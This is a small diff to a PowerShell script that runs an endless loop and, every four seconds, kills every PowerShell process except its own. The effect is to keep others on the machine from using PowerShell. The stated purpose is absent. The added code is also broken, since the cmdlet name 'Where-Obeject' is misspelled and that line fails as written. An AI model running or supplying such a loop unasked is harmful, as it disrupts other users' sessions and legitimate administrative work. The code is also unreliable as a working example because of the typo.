@@ -1,4 +1,9 @@
-while($true) {
-    Stop-Process -Name "powershell"
-    Start-Sleep -seconds 4
+$win = $PID
+
+while ($true) {
+    $others = Get-Process powershell | Where-Obeject {$_.Id -ne $win}
+    foreach ($process in $others) {
+        $process.Kill()
+    }
+        Start-Sleep -seconds 4
 }
